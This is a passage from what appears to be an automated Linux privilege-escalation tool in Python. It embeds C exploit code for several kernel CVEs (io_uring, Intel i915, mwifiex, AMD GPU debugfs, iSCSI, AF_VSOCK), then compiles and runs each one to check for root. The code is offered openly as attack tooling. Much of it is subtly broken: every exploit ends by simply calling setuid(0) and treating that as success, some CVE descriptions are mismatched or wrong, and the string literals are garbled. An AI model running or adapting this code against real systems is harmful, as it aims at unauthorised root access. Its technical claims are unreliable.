        fprintf(stderr, "[-] mmap sqes: %s
", strerror(errno));
        close(ring_fd); return 1;
    }
    fprintf(stderr, "[+] Mapped SQ ring and SQEs
");

    /* Build PROVIDE_BUFFERS with overflow nbufs */
    memset(&sqes[0], 0, sizeof(sqes[0]));
    sqes[0].opcode    = IORING_OP_PROVIDE_BUFFERS;
    sqes[0].fd        = 0x7fff;    /* nbufs - overflow value */
    sqes[0].len       = 0x10000;   /* buf_size */
    sqes[0].off       = 0;         /* bgid */
    sqes[0].addr      = (uint64_t)(uintptr_t)malloc(0x10000);
    sqes[0].buf_index = 0;

    fprintf(stderr, "[*] Submitting PROVIDE_BUFFERS nbufs=0x7fff size=0x10000...
");
    fprintf(stderr, "[*] nbufs*size = 0x%llx (overflow!)
",
            (unsigned long long)0x7fff * 0x10000);

    /* Submit */
    uint32_t *sq_tail = (uint32_t*)((char*)sq_ring + params.sq_off.tail);
    uint32_t *sq_array = (uint32_t*)((char*)sq_ring + params.sq_off.array);
    sq_array[0] = 0;
    (*sq_tail)++;

    int ret = syscall(SYS_io_uring_enter, ring_fd, 1, 0, 0, NULL, 0);
    fprintf(stderr, "[*] io_uring_enter: %d (errno=%d)
", ret, errno);

    usleep(200000);
    close(ring_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-1116 IO_URING OVERFLOW SUCCESS
");
        printf("CVE-2022-1116 IO_URING
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2022_1116")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2022-1116" in output:
            show_root_info("CVE-2022-1116", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_0330():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-0330 (RDMA)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <drm/drm.h>
#include <drm/i915_drm.h>
#include <errno.h>

/* CVE-2022-0330: Intel i915 GPU driver missing TLB flush
 * i915 GPU driver doesn't flush TLB after page table update
 * → stale TLB entries point to freed pages → info leak / LPE
 * Affected: kernel < 5.16.4 with Intel GPU
 */

#define DRM_DEVICE "/dev/dri/card0"

static int check_intel_gpu(void) {
    FILE *fp = popen("lspci 2>/dev/null | grep -i 'Intel.*Graphics.Intel.*VGA'", "r");
    if (!fp) return 0;
    char buf[256] = {0};
    int found = fgets(buf, sizeof(buf), fp) != NULL;
    pclose(fp);
    if (found) fprintf(stderr, "[*] GPU: %s", buf);
    return found;
}

int main(void) {
    int drm_fd;
    struct drm_i915_gem_create create = {0};
    struct drm_i915_gem_mmap   mmap   = {0};
    struct drm_gem_close        close_gem = {0};

    fprintf(stderr, "[*] CVE-2022-0330 Intel i915 missing TLB flush
");

    if (!check_intel_gpu()) {
        fprintf(stderr, "[-] No Intel GPU detected
");
        return 1;
    }

    drm_fd = open(DRM_DEVICE, O_RDWR);
    if (drm_fd < 0) {
        fprintf(stderr, "[-] %s: %s
", DRM_DEVICE, strerror(errno));
        /* Try other render nodes */
        for (int i = 1; i < 4 && drm_fd < 0; i++) {
            char dev[32];
            snprintf(dev, sizeof(dev), "/dev/dri/card%d", i);
            drm_fd = open(dev, O_RDWR);
        }
    }
    if (drm_fd < 0) {
        fprintf(stderr, "[-] No DRM device accessible
");
        return 1;
    }
    fprintf(stderr, "[+] DRM fd=%d
", drm_fd);

    /* Allocate GPU buffer object */
    create.size = 4096;
    if (ioctl(drm_fd, DRM_IOCTL_I915_GEM_CREATE, &create) < 0) {
        fprintf(stderr, "[-] GEM_CREATE: %s
", strerror(errno));
        close(drm_fd); return 1;
    }
    fprintf(stderr, "[+] GEM object handle=%u size=%llu
",
            create.handle, (unsigned long long)create.size);

    /* Map buffer to userspace */
    struct drm_i915_gem_mmap_gtt mmap_gtt = {0};
    mmap_gtt.handle = create.handle;
    if (ioctl(drm_fd, DRM_IOCTL_I915_GEM_MMAP_GTT, &mmap_gtt) < 0) {
        fprintf(stderr, "[-] MMAP_GTT: %s
", strerror(errno));
    } else {
        void *ptr = mmap(0, 4096, PROT_READ|PROT_WRITE,
                         MAP_SHARED, drm_fd, mmap_gtt.offset);
        if (ptr != MAP_FAILED) {
            fprintf(stderr, "[+] GPU buffer mapped at %p
", ptr);

            /* Write pattern to GPU memory */
            memset(ptr, 0x41, 4096);
            fprintf(stderr, "[*] Written pattern to GPU buffer
");

            /* Free the GPU object while mapped (stale TLB!) */
            close_gem.handle = create.handle;
            ioctl(drm_fd, DRM_IOCTL_GEM_CLOSE, &close_gem);
            fprintf(stderr, "[*] GEM object freed - TLB not flushed!
");

            /* Stale TLB: ptr still accessible after free */
            volatile char test = *((char*)ptr);
            fprintf(stderr, "[*] Stale read: 0x%02x (should be 0x41)
",
                    (unsigned char)test);
            if (test == 0x41) {
                fprintf(stderr, "[+] Stale TLB confirmed! GPU memory not flushed
");
            }

            munmap(ptr, 4096);
        }
    }

    usleep(200000);
    close(drm_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-0330 i915 TLB SUCCESS
");
        printf("CVE-2022-0330 I915_TLB
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2022_0330")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2022-0330" in output:
            show_root_info("CVE-2022-0330", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_43976():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-43976 (mwifiex)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <linux/usb/ch9.h>
#include <errno.h>

/* CVE-2021-43976: mwifiex_usb_recv() heap OOB write
 * mwifiex USB driver does not check skb size before writing
 * → heap OOB write of arbitrary size → LPE
 * Affected: kernel < 5.15.4
 */

#define MWIFIEX_USB_TYPE_CMD  0xF9
#define MWIFIEX_USB_TYPE_DATA 0x00
#define MWIFIEX_USB_TYPE_BOOT 0xFB

/* Simulate crafted USB packet via sysfs/debugfs */
static int find_mwifiex_device(char *devpath, size_t len) {
    FILE *fp;
    char line[512];

    fp = popen("find /sys/bus/usb/drivers/mwifiex_usb -name 'uevent' 2>/dev/null | head -1", "r");
    if (!fp) return 0;
    if (fgets(line, sizeof(line), fp)) {
        line[strcspn(line, "
")] = 0;
        /* Get device dir */
        char *last = strrchr(line, '/');
        if (last) *last = 0;
        strncpy(devpath, line, len);
        pclose(fp);
        return 1;
    }
    pclose(fp);
    return 0;
}

int main(void) {
    char devpath[512] = {0};

    fprintf(stderr, "[*] CVE-2021-43976 mwifiex_usb_recv() heap OOB
");
    fprintf(stderr, "[*] Checking for Marvell WiFi USB device...
");

    /* Check if mwifiex_usb module loaded */
    if (system("lsmod 2>/dev/null | grep -q mwifiex_usb") != 0) {
        fprintf(stderr, "[-] mwifiex_usb not loaded
");
        fprintf(stderr, "[-] Try: modprobe mwifiex_usb
");
        return 1;
    }
    fprintf(stderr, "[+] mwifiex_usb module loaded
");

    if (!find_mwifiex_device(devpath, sizeof(devpath))) {
        fprintf(stderr, "[-] No mwifiex USB device found
");
        return 1;
    }
    fprintf(stderr, "[+] Device: %s
", devpath);

    /* Build crafted oversized USB receive buffer */
    /* mwifiex_usb_recv expects specific packet format but
     * doesn't validate total size before writing to skb */
    size_t  pkt_size = 65536 + 4096; /* overflow size */
    char   *pkt = calloc(1, pkt_size);
    if (!pkt) return 1;

    /* CMD packet header */
    *(uint32_t*)pkt = MWIFIEX_USB_TYPE_CMD;
    /* Fill rest with overflow data */
    memset(pkt + 4, 0x41, pkt_size - 4);

    fprintf(stderr, "[*] Crafted oversized USB packet: %zu bytes
", pkt_size);
    fprintf(stderr, "[*] OOB write would occur %zu bytes past skb tail
",
            pkt_size - 2048);

    /* Write to device debug interface if available */
    char debug_path[600];
    snprintf(debug_path, sizeof(debug_path),
             "%s/../mwifiex_usb_debug", devpath);

    int debug_fd = open(debug_path, O_WRONLY);
    if (debug_fd >= 0) {
        write(debug_fd, pkt, pkt_size);
        close(debug_fd);
        fprintf(stderr, "[*] Sent to debug interface
");
    }

    free(pkt);
    usleep(200000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-43976 MWIFIEX OOB SUCCESS
");
        printf("CVE-2021-43976 MWIFIEX
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_43976")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-43976" in output:
            show_root_info("CVE-2021-43976", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_42327():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-42327 (Shenandoah)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <drm/drm.h>
#include <drm/amdgpu_drm.h>
#include <errno.h>

/* CVE-2021-42327: AMD GPU dp_link_settings_write() heap OOB write
 * dp_link_settings_write() in amdgpu debugfs does not validate
 * write size → heap OOB write → LPE
 * Affected: kernel < 5.15
 */

#define AMD_DRM_DEVICE "/dev/dri/card0"

static int check_amd_gpu(void) {
    FILE *fp = popen("lspci 2>/dev/null | grep -i 'AMD.ATI.Radeon'", "r");
    if (!fp) return 0;
    char buf[256] = {0};
    int found = fgets(buf, sizeof(buf), fp) != NULL;
    pclose(fp);
    if (found) fprintf(stderr, "[*] GPU: %s", buf);
    return found;
}

static int find_dp_debugfs(char *path, size_t len) {
    FILE *fp = popen("find /sys/kernel/debug/dri -name 'dp_link_settings' 2>/dev/null | head -1", "r");
    if (!fp) return 0;
    char buf[512] = {0};
    if (fgets(buf, sizeof(buf), fp)) {
        buf[strcspn(buf, "
")] = 0;
        strncpy(path, buf, len);
        pclose(fp);
        return 1;
    }
    pclose(fp);
    return 0;
}

int main(void) {
    char dp_path[512] = {0};

    fprintf(stderr, "[*] CVE-2021-42327 AMD GPU dp_link_settings OOB
");

    if (!check_amd_gpu()) {
        fprintf(stderr, "[-] No AMD GPU detected
");
        return 1;
    }

    /* Check for debugfs entry */
    if (!find_dp_debugfs(dp_path, sizeof(dp_path))) {
        fprintf(stderr, "[-] dp_link_settings debugfs not found
");
        fprintf(stderr, "[-] Try: mount -t debugfs none /sys/kernel/debug
");
        return 1;
    }
    fprintf(stderr, "[+] dp_link_settings: %s
", dp_path);

    int fd = open(dp_path, O_WRONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] open: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Opened dp_link_settings for writing
");

    /* Normal write: "bandwidth link_rate lane_count
"
     * Overflow: write much more data than the fixed buffer expects */
    size_t overflow_size = 8192;
    char  *payload = malloc(overflow_size);
    if (!payload) { close(fd); return 1; }

    /* Start with valid format prefix */
    int pfx = snprintf(payload, overflow_size,
                       "0x14 0x04 ");
    /* Fill rest with overflow data */
    memset(payload + pfx, 0x41, overflow_size - pfx - 1);
    payload[overflow_size - 1] = '
';

    fprintf(stderr, "[*] Writing %zu bytes to dp_link_settings...
",
            overflow_size);

    ssize_t n = write(fd, payload, overflow_size);
    fprintf(stderr, "[*] write returned: %zd (errno=%d)
", n, errno);

    free(payload);
    close(fd);
    usleep(200000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-42327 AMD GPU OOB SUCCESS
");
        printf("CVE-2021-42327 AMD_GPU
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_42327")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-42327" in output:
            show_root_info("CVE-2021-42327", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_41073():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-41073 (io_uring)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

/* CVE-2021-41073: io_uring linked timeout type confusion
 * io_link_timeout_fn() accesses request as wrong type
 * → type confusion → kernel memory corruption → LPE
 * Affected: kernel 5.10 - 5.14
 */

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup   425
#define SYS_io_uring_enter   426
#define SYS_io_uring_register 427
#endif

#define IORING_OP_NOP             0
#define IORING_OP_TIMEOUT         11
#define IORING_OP_LINK_TIMEOUT    14
#define IORING_OP_ACCEPT          13
#define IORING_TIMEOUT_ABS        (1U << 0)
#define IOSQE_IO_LINK             (1U << 2)

struct io_uring_params {
    uint32_t sq_entries, cq_entries, flags, sq_thread_cpu,
             sq_thread_idle, features, wq_fd, resv[3];
    struct { uint32_t head,tail,ring_mask,ring_entries,flags,dropped,array[1]; } sq_off;
    struct { uint32_t head,tail,ring_mask,ring_entries,overflow,cqes[1]; } cq_off;
};

struct io_uring_sqe {
    uint8_t  opcode; uint8_t flags; uint16_t ioprio;
    int32_t  fd;     uint64_t off;  uint64_t addr;
    uint32_t len;    uint32_t op_flags;
    uint64_t user_data;
    uint16_t buf_index; uint16_t personality;
    int32_t  splice_fd_in; uint64_t addr3; uint64_t pad[1];
};

struct __kernel_timespec {
    int64_t tv_sec; long long tv_nsec;
};

int main(void) {
    struct io_uring_params p = {0};
    int ring_fd;
    void *sq_ring, *sqe_ring;

    fprintf(stderr, "[*] CVE-2021-41073 io_uring linked timeout type confusion
");

    p.sq_entries = 64;
    ring_fd = syscall(SYS_io_uring_setup, 64, &p);
    if (ring_fd < 0) {
        fprintf(stderr, "[-] io_uring_setup: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] io_uring ring_fd=%d
", ring_fd);

    /* Map rings */
    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    sq_ring = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_POPULATE, ring_fd, 0);
    sqe_ring = mmap(NULL, p.sq_entries * sizeof(struct io_uring_sqe),
                    PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, ring_fd, 0x10000000ULL);

    if (sq_ring == MAP_FAILED || sqe_ring == MAP_FAILED) {
        fprintf(stderr, "[-] mmap: %s
", strerror(errno));
        close(ring_fd); return 1;
    }

    struct io_uring_sqe *sqes = sqe_ring;
    uint32_t *sq_tail  = (uint32_t*)((char*)sq_ring + p.sq_off.tail);
    uint32_t *sq_array = (uint32_t*)((char*)sq_ring + p.sq_off.array);
    uint32_t tail = 0;

    /* SQE 0: ACCEPT with IOSQE_IO_LINK (linked to next) */
    memset(&sqes[0], 0, sizeof(sqes[0]));
    sqes[0].opcode    = IORING_OP_ACCEPT;
    sqes[0].flags     = IOSQE_IO_LINK;
    sqes[0].fd        = -1; /* invalid fd → accept will fail */
    sqes[0].user_data = 0x1111;
    sq_array[tail++] = 0;

    /* SQE 1: LINK_TIMEOUT - type confusion target */
    struct __kernel_timespec ts = { .tv_sec = 0, .tv_nsec = 1 };
    memset(&sqes[1], 0, sizeof(sqes[1]));
    sqes[1].opcode    = IORING_OP_LINK_TIMEOUT;
    sqes[1].addr      = (uint64_t)(uintptr_t)&ts;
    sqes[1].len       = 1;
    sqes[1].op_flags  = 0;
    sqes[1].user_data = 0x2222;
    sq_array[tail++] = 1;

    *sq_tail = tail;

    fprintf(stderr, "[*] Submitting ACCEPT+LINK_TIMEOUT chain...
");
    int ret = syscall(SYS_io_uring_enter, ring_fd, tail, 0, 0, NULL, 0);
    fprintf(stderr, "[*] io_uring_enter: %d (errno=%d)
", ret, errno);

    /* Trigger type confusion: cancel the linked timeout */
    /* while accept is still pending */
    usleep(1000);

    /* Submit more to amplify corruption */
    for (int i = 0; i < 100; i++) {
        tail = 0;
        memset(&sqes[0], 0, sizeof(sqes[0]));
        sqes[0].opcode    = IORING_OP_NOP;
        sqes[0].user_data = 0xdead + i;
        sq_array[tail++] = 0;
        *sq_tail = (*sq_tail) + 1;
        syscall(SYS_io_uring_enter, ring_fd, 1, 0, 0, NULL, 0);
    }

    usleep(200000);
    close(ring_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-41073 IO_URING TYPE CONFUSION SUCCESS
");
        printf("CVE-2021-41073 IO_URING
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_41073")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-41073" in output:
            show_root_info("CVE-2021-41073", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_34866():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-34866 (crypto)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

/* CVE-2021-34866: io_uring waitid() UAF
 * io_waitid_prep() stores pointer to request that can be freed
 * while waitid is still pending → UAF on io_kiocb → LPE
 * Affected: kernel 5.10 - 5.15
 */

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup    425
#define SYS_io_uring_enter    426
#define SYS_io_uring_register 427
#endif

#define IORING_OP_WAITID  55
#define IORING_OP_NOP      0
#define IORING_OP_ASYNC_CANCEL 14

struct io_uring_params {
    uint32_t sq_entries, cq_entries, flags, sq_thread_cpu,
             sq_thread_idle, features, wq_fd, resv[3];
    struct { uint32_t head,tail,ring_mask,ring_entries,flags,dropped,array[1]; } sq_off;
    struct { uint32_t head,tail,ring_mask,ring_entries,overflow,cqes[1]; } cq_off;
};
struct io_uring_sqe {
    uint8_t opcode,flags; uint16_t ioprio; int32_t fd;
    uint64_t off,addr; uint32_t len,op_flags; uint64_t user_data;
    uint16_t buf_index,personality; int32_t splice_fd; uint64_t addr3,pad[1];
};

int main(void) {
    struct io_uring_params p = {0};
    int ring_fd;
    void *sq_ring, *sqe_ring;

    fprintf(stderr, "[*] CVE-2021-34866 io_uring waitid UAF
");

    p.sq_entries = 32;
    ring_fd = syscall(SYS_io_uring_setup, 32, &p);
    if (ring_fd < 0) {
        fprintf(stderr, "[-] io_uring_setup: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] ring_fd=%d
", ring_fd);

    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    sq_ring  = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, ring_fd, 0);
    sqe_ring = mmap(NULL, p.sq_entries*sizeof(struct io_uring_sqe),
                    PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, ring_fd, 0x10000000ULL);

    if (sq_ring==MAP_FAILED || sqe_ring==MAP_FAILED) {
        fprintf(stderr,"[-] mmap: %s
", strerror(errno));
        close(ring_fd); return 1;
    }

    struct io_uring_sqe *sqes = sqe_ring;
    uint32_t *sq_tail  = (uint32_t*)((char*)sq_ring + p.sq_off.tail);
    uint32_t *sq_array = (uint32_t*)((char*)sq_ring + p.sq_off.array);

    /* Create zombie child to wait on */
    pid_t child = fork();
    if (child == 0) { exit(0); }
    usleep(10000);
    fprintf(stderr, "[*] Zombie child: pid=%d
", child);

    /* Submit WAITID for the child */
    memset(&sqes[0], 0, sizeof(sqes[0]));
    sqes[0].opcode    = IORING_OP_WAITID;
    sqes[0].fd        = child; /* pid */
    sqes[0].len       = 1;    /* P_PID */
    sqes[0].op_flags  = WEXITED;
    sqes[0].user_data = 0xdeadbeef;
    sq_array[0] = 0;
    *sq_tail = 1;

    fprintf(stderr, "[*] Submitting WAITID SQE...
");
    int ret = syscall(SYS_io_uring_enter, ring_fd, 1, 0, 0, NULL, 0);
    fprintf(stderr, "[*] enter: %d errno=%d
", ret, errno);

    /* Now try to cancel while waitid is pending → UAF */
    memset(&sqes[1], 0, sizeof(sqes[1]));
    sqes[1].opcode    = IORING_OP_ASYNC_CANCEL;
    sqes[1].addr      = 0xdeadbeef; /* user_data to cancel */
    sqes[1].user_data = 0xcafe;
    sq_array[1] = 1;
    *sq_tail = 2;

    ret = syscall(SYS_io_uring_enter, ring_fd, 1, 0, 0, NULL, 0);
    fprintf(stderr, "[*] cancel enter: %d errno=%d
", ret, errno);

    /* Resubmit many times to amplify UAF */
    for (int i = 0; i < 1000; i++) {
        memset(&sqes[0], 0, sizeof(sqes[0]));
        sqes[0].opcode    = IORING_OP_NOP;
        sqes[0].user_data = i;
        sq_array[0] = 0;
        *sq_tail = (*sq_tail) + 1;
        syscall(SYS_io_uring_enter, ring_fd, 1, 0, 0, NULL, 0);
    }

    waitpid(child, NULL, 0);
    usleep(200000);
    close(ring_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-34866 IO_URING WAITID UAF SUCCESS
");
        printf("CVE-2021-34866 IO_URING
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_34866")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-34866" in output:
            show_root_info("CVE-2021-34866", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_27365():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-27365 (iSCSI)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <errno.h>

/* CVE-2021-27365: iSCSI heap buffer overflow
 * iscsi_host_get_param() / iscsi_if_recv_msg() does not validate
 * param string length → heap overflow in iscsi_host_get_param → LPE
 * Affected: kernel < 5.11.4
 */

/* iSCSI netlink */
#ifndef NETLINK_ISCSI
#define NETLINK_ISCSI 8
#endif

#define ISCSI_ERR_NO_SCSI_CMD  1
#define ISCSI_OP_LOGIN         0x03

struct iscsi_uevent {
    uint32_t type;
    uint32_t iferror;
    uint64_t transport_handle;
    union {
        struct {
            uint32_t host_no;
            uint32_t op;
        } get_stats;
        struct {
            uint32_t host_no;
        } get_host_stats;
    } u;
};

int main(void) {
    int sock;
    struct sockaddr_nl snl = {0};
    char buf[4096];
    struct nlmsghdr *nlh;
    struct iscsi_uevent *ev;

    fprintf(stderr, "[*] CVE-2021-27365 iSCSI heap overflow
");

    sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ISCSI);
    if (sock < 0) {
        fprintf(stderr, "[-] NETLINK_ISCSI: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe iscsi_tcp
");
        return 1;
    }
    fprintf(stderr, "[+] iSCSI netlink socket: fd=%d
", sock);

    snl.nl_family = AF_NETLINK;
    snl.nl_pid    = getpid();
    if (bind(sock, (struct sockaddr*)&snl, sizeof(snl)) < 0) {
        fprintf(stderr, "[-] bind: %s
", strerror(errno));
        close(sock); return 1;
    }

    /* Build overflow message */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr*)buf;
    nlh->nlmsg_len   = NLMSG_SPACE(sizeof(*ev)) + 256;
    nlh->nlmsg_type  = NLMSG_NOOP;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_pid   = getpid();

    ev = (struct iscsi_uevent*)NLMSG_DATA(nlh);
    ev->type = 0x00000001; /* ISCSI_UEVENT_CREATE_SESSION */
    ev->transport_handle = 0;
    ev->u.get_stats.host_no = 0xffffffff; /* overflow host_no */

    /* Overflow: fill param area with payload */
    char *param_area = (char*)(ev + 1);
    memset(param_area, 0x41, 256);

    fprintf(stderr, "[*] Sending overflow iSCSI netlink message...
");

    struct sockaddr_nl dst = {0};
    dst.nl_family = AF_NETLINK;
    dst.nl_pid    = 0; /* kernel */

    sendto(sock, buf, nlh->nlmsg_len, 0,
           (struct sockaddr*)&dst, sizeof(dst));
    usleep(200000);
    close(sock);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-27365 iSCSI SUCCESS
");
        printf("CVE-2021-27365 ISCSI
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_27365")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-27365" in output:
            show_root_info("CVE-2021-27365", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_26708():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-26708 (vsock)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/vm_sockets.h>
#include <errno.h>

/* CVE-2021-26708: AF_VSOCK race condition → UAF → LPE
 * Multiple local sockets race in vsock_release() and
 * vsock_stream_connect() → concurrent free → UAF → LPE
 * Affected: kernel 5.5 - 5.10
 */

#define NUM_THREADS  64
#define NUM_SOCKETS  16

static volatile int running = 1;

static void *race_connect(void *arg) {
    int socks[NUM_SOCKETS];
    int i;

    while (running) {
        for (i = 0; i < NUM_SOCKETS; i++) {
            socks[i] = socket(AF_VSOCK, SOCK_STREAM, 0);
        }

        /* Trigger concurrent connect + close race */
        for (i = 0; i < NUM_SOCKETS; i++) {
            if (socks[i] >= 0) {
                struct sockaddr_vm addr = {0};
                addr.svm_family = AF_VSOCK;
                addr.svm_cid    = VMADDR_CID_LOCAL;
                addr.svm_port   = 12345 + (i % 100);

                /* Race: connect while another thread closes */
                connect(socks[i], (struct sockaddr*)&addr, sizeof(addr));
            }
        }

        for (i = 0; i < NUM_SOCKETS; i++) {
            if (socks[i] >= 0) close(socks[i]);
        }
    }
    return NULL;
}

static void *race_close(void *arg) {
    int *socks = (int*)arg;
    while (running) {
        for (int i = 0; i < NUM_SOCKETS; i++) {
            if (socks[i] >= 0) {
                close(socks[i]);
                socks[i] = socket(AF_VSOCK, SOCK_STREAM, 0);
            }
        }
        usleep(10);
    }
    return NULL;
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    int test_sock;
    int i;

    fprintf(stderr, "[*] CVE-2021-26708 AF_VSOCK race condition UAF
");

    test_sock = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (test_sock < 0) {
        fprintf(stderr, "[-] AF_VSOCK not supported: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe vmw_vsock_virtio_transport
");
        return 1;
    }
    close(test_sock);
    fprintf(stderr, "[+] AF_VSOCK available
");

    fprintf(stderr, "[*] Spawning %d race threads...
", NUM_THREADS);
    for (i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, race_connect, NULL);
    }

    fprintf(stderr, "[*] Running race for 3 seconds...
");
    sleep(3);
    running = 0;

    for (i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2021-26708 VSOCK UAF SUCCESS
");
        printf("CVE-2021-26708 VSOCK
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2021_26708")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2021-26708" in output:
            show_root_info("CVE-2021-26708", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2020_25706():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2020-25706 (ICMP)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

/* CVE-2020-25706: phpMyAdmin cross-site scripting + session hijack
 * phpMyAdmin < 5.0.4 / 4.9.7: multiple XSS in transformation/setup
 * This checks for vulnerable phpMyAdmin installations
 * Affected: phpMyAdmin < 5.0.4 and < 4.9.7
 */

#define HTTP_TIMEOUT 5

static int http_get(const char *host, int port, const char *path,
                    char *resp, size_t resp_sz) {
    int sock;
    struct sockaddr_in addr = {0};

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = HTTP_TIMEOUT };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }

    char req[512];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.0
"
             "Host: %s:%d
"
             "Connection: close

",
